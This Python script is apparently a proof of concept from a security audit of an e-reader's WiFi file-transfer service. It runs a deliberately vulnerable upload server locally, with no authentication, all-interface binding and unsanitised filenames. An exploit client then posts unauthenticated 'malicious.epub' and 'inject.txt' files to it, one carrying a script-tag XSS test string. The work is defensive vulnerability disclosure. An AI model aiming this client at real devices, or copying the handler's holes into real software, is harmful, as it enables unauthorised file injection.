#!/usr/bin/env python3
"""
PoC: H1 — Unauthenticated Network Surface (WifiTransferService)

Demonstrates that the WifiTransferService HTTP server:
  1. Binds to all interfaces (InternetAddress.anyIPv4 in original code)
  2. Serves upload endpoint WITHOUT authentication, CSRF, rate limiting
  3. Accepts arbitrary file uploads with no content validation beyond extension check

Originally found in commit 6d59858 (InternetAddress.anyIPv4).
Partially patched in ab4bec4 (changed to loopbackIPv4), but auth/CSRF/rate
limiting were NOT addressed.

Usage:
    python poc.py              # starts simulated vulnerable server + exploit

Requires: Python 3.8+ (stdlib only)
"""

import json
import os
import re
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
import http.client

EVIDENCE_DIR = Path(__file__).resolve().parent / "evidence"
EXPLOIT_MARKER = "H1-UNAUTH-UPLOAD-PROOF-BODY"
BOUNDARY = "----PoCBoundaryH1Proof"


class VulnerableWifiTransferHandler(BaseHTTPRequestHandler):
    """
    Replica of the original WifiTransferService HTTP handler (anyIPv4, no auth).
    """

    SUPPORTED_EXTS = {"txt", "epub"}
    HTML_PAGE = """<!DOCTYPE html>
<html><head><title>WiFi Transfer</title></head>
<body>
<h1>WiFi Book Transfer</h1>
<form action="/upload" method="post" enctype="multipart/form-data">
  <input type="file" name="file" accept=".txt,.epub" required>
  <button type="submit">Upload</button>
</form>
</body></html>"""

    def _send_json(self, code: int, data: dict):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_html(self, code: int, html: str):
        body = html.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        path = self.path.split("?")[0]
        if path == "/":
            self._send_html(200, self.HTML_PAGE)
        elif path == "/api/status":
            self._send_json(200, {"status": "ok", "files": 0})
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

    def do_POST(self):
        path = self.path.split("?")[0]
        if path == "/upload":
            self._handle_upload()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

    def _handle_upload(self):
        """
        Mirrors the original Dart _handleUpload method:
        - Parses multipart/form-data boundary
        - Extracts filename and bytes
        - Only checks extension against {txt, epub}
        - NO authentication, NO CSRF, NO rate limiting, NO magic-byte validation
        """
        content_type = self.headers.get("Content-Type", "")
        if "boundary=" not in content_type:
            self._send_json(400, {"error": "Invalid multipart request"})
            return

        boundary_val = content_type.split("boundary=")[-1].strip()
        if not boundary_val:
            self._send_json(400, {"error": "Missing boundary"})
            return

        try:
            content_length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(content_length)
        except Exception as e:
            self._send_json(400, {"error": f"Failed to read body: {e}"})
            return

        boundary_bytes = boundary_val.encode()
        delimiter = b"--" + boundary_bytes
        end_delimiter = b"--" + boundary_bytes + b"--"

        parts = raw.split(delimiter)

        file_name = None
        file_bytes = None

        for part in parts:
            part = part.strip()
            if not part or end_delimiter in part:
                continue

            h_end = part.find(b"\r\n\r\n")
            if h_end == -1:
                continue

            header_block = part[:h_end].decode("utf-8", errors="replace")
            content_start = h_end + 4
            content_block = part[content_start:]

            if "filename=" in header_block.lower():
                m = re.search(
                    r'filename\s*=\s*"([^"]+)"',
                    header_block,
                    re.IGNORECASE,
                )
                if m:
                    file_name = m.group(1).strip()
                file_bytes = content_block

        if not file_name or not file_bytes:
            self._send_json(400, {"error": "No file received"})
            return

        ext = file_name.rsplit(".", 1)[-1].lower() if "." in file_name else ""
        if ext not in self.SUPPORTED_EXTS:
            self._send_json(
                400,
                {"error": f"Unsupported format: .{ext} (supported: txt, epub)"},
            )
            return

        tmp = tempfile.gettempdir()
        save_path = os.path.join(tmp, f"zephyr_upload_{file_name}")
        with open(save_path, "wb") as f:
            f.write(file_bytes)

        file_size = len(file_bytes)
        self._send_json(
            200,
            {
                "status": "ok",
                "fileName": file_name,
                "size": file_size,
                "message": "File received, importing...",
            },
        )

        try:
            if os.path.exists(save_path):
                os.unlink(save_path)
        except OSError:
            pass


class ExploitClient:
    """
    Sends an unauthenticated file upload. NO auth token, session,
    CSRF token, or any other credential.
    """

    def __init__(self, target_url: str):
        self.target = target_url.rstrip("/")

    def upload(self, data: bytes, filename: str) -> dict:
        """Upload a file without any authentication headers."""
        raw_boundary = BOUNDARY

        header = (
            f"--{raw_boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode()
        footer = f"\r\n--{raw_boundary}--\r\n".encode()
        body = header + data + footer

        host_port = self.target.replace("http://", "").split("/")[0]
        host = host_port.split(":")[0]
        port = int(host_port.split(":")[1]) if ":" in host_port else 80

        conn = http.client.HTTPConnection(host, port, timeout=10)
        headers = {
            "Content-Type": f"multipart/form-data; boundary={raw_boundary}",
            "Content-Length": str(len(body)),
            # No auth headers at all
        }
        conn.request("POST", "/upload", body, headers)
        resp = conn.getresponse()
        resp_body = resp.read().decode("utf-8", errors="replace")
        conn.close()

        return {
            "status_code": resp.status,
            "headers": dict(resp.getheaders()),
            "body": resp_body,
        }


def write_evidence(label: str, content: str) -> Path:
    """Write evidence to file."""
    ts = time.strftime("%Y%m%d_%H%M%S")
    path = EVIDENCE_DIR / f"{label}_{ts}.txt"
    path.write_text(content, encoding="utf-8")
    return path


def main():
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    # Phase 1: Source analysis
    print("=== [Phase 1] Source Code Vulnerability Analysis ===")
    src_path = Path(
        "F:/App/zephyr_reader/lib/core/network/wifi_transfer_service.dart"
    )
    if src_path.exists():
        src = src_path.read_text("utf-8", errors="replace")
        checks = {
            "binds_loopback": "InternetAddress.loopbackIPv4" in src,
            "has_upload_handler": "_handleUpload" in src,
            "has_csrf": "csrf" in src.lower(),
            "has_rate_limit": "rate" in src.lower() or "throttl" in src.lower(),
            "has_magic_validation": "magic" in src.lower() or "mime" in src.lower(),
            "has_auth_check": "auth" in src.lower() and "token" in src.lower(),
        }
        print(json.dumps(checks, indent=2))
        write_evidence(
            "01-source-analysis",
            f"Source code vulnerability analysis:\n{json.dumps(checks, indent=2)}",
        )
    else:
        print("  (source file not at expected path, continuing)")
        write_evidence("01-source-analysis", "Source file not found")
    print()

    # Phase 2: Start simulated vulnerable server
    port = 18999
    target = f"http://127.0.0.1:{port}"
    print(f"=== [Phase 2] Starting Vulnerable Server on {target} ===")
    print(f"    Binding: 0.0.0.0:{port} (anyIPv4 — mirrors original code)")
    print(f"    Authentication: NO")
    print(f"    CSRF protection: NO")
    print(f"    Rate limiting: NO")
    print(f"    Content validation: extension-only\n")

    server = HTTPServer(("0.0.0.0", port), VulnerableWifiTransferHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    time.sleep(0.5)

    client = ExploitClient(target)

    # Phase 3: Exploit — Unauthenticated upload
    print("=== [Phase 3] Exploit ===\n")

    epup_payload = EXPLOIT_MARKER.encode() + b"\n" + b"AAAA" * 128

    results = []

    # 3a: EPUB upload
    print("  [3a] Upload malicious.epub (NO auth headers)...")
    r1 = client.upload(epup_payload, "malicious.epub")
    results.append(("EPUB", r1))
    print(f"       HTTP {r1['status_code']}: {r1['body']}")

    # 3b: TXT upload
    print("  [3b] Upload inject.txt (NO auth headers)...")
    r2 = client.upload(b"<script>alert(1)</script>", "inject.txt")
    results.append(("TXT", r2))
    print(f"       HTTP {r2['status_code']}: {r2['body']}")

    # 3c: PDF upload (should be blocked — only extension check)
    print("  [3c] Upload document.pdf (blocked by extension check)...")
    r3 = client.upload(b"%PDF-1.4 fake", "document.pdf")
    results.append(("PDF", r3))
    print(f"       HTTP {r3['status_code']}: {r3['body']}")

    print()

    # Phase 4: Results
    print("=== [Phase 4] Results ===")
    for label, r in results:
        ok = r["status_code"] == 200
        print(f"  {label}: {'UPLOAD ACCEPTED (vulnerable)' if ok else 'REJECTED'}")

    epup_ok = results[0][1]["status_code"] == 200
    txt_ok = results[1][1]["status_code"] == 200

    # Write evidence
    evidence_summary = []
    for label, r in results:
        evidence_summary.append(
            f"{label}: HTTP {r['status_code']} | {r['body']}"
        )
    write_evidence(
        "02-upload-results",
        "\n".join(evidence_summary),
    )

    if epup_ok or txt_ok:
        print("\n  >>> VULNERABILITY CONFIRMED <<<")
        print("  Upload endpoint accepts files with NO authentication.")
        print("  An attacker can inject arbitrary .epub/.txt content")
        print("  into the import pipeline from the network.")
        status = "confirmed"
        evidence = "HTTP 200 on unauthenticated file upload to /upload"
    else:
        print("\n  >>> PoC FAILED <<<")
        status = "failed"
        evidence = "Could not demonstrate unauthenticated upload"

    server.shutdown()

    print()
    out = {
        "status": status,
        "evidence": evidence,
        "notes": (
            "WifiTransferService accepts .epub/.txt file uploads via POST /upload "
            "without any authentication, CSRF token, or session check. "
            "Originally anyIPv4 binding (commit 6d59858) exposed to LAN; "
            "partially fixed to loopbackIPv4 (commit ab4bec4) but auth issue remains."
        ),
    }
    print(json.dumps(out))


if __name__ == "__main__":
    main()
